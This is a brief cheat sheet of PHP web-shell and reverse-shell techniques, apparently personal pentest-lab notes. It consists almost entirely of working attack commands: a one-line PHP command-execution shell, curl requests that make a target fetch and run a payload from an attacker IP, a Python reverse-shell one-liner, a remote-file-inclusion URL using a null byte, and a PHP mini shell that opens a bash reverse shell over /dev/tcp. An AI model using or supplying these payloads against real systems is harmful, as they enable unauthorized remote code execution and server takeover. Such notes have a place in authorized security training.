# PHP Shells

**<u>Single Curl Download and Run command:</u>**

```bash
#create php file
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' > pwn.php

#generate metasploit shell
#then run command
curl -s -G http://10.11.1.252:8000/pwn.php \
  --data-urlencode 'c=wget -P /tmp http://192.168.119.131/pwn.elf && chmod +x /tmp/pwn.elf && /tmp/pwn.elf' 
  
#python shell
curl -s -G http://10.11.1.252:8000/pwn.php \
  --data-urlencode "c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.131\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```

**<u>Reverse shells</u>**

https://github.com/pentestmonkey/php-reverse-shell

Can also save the php-reverse shell as .txt:

```bash
https://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://$my-ip/php-reverse-shell.txt%00
```

Mini shell.php:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

P0wny shell: https://github.com/flozz/p0wny-shell

```bash
Host the shell.php
```

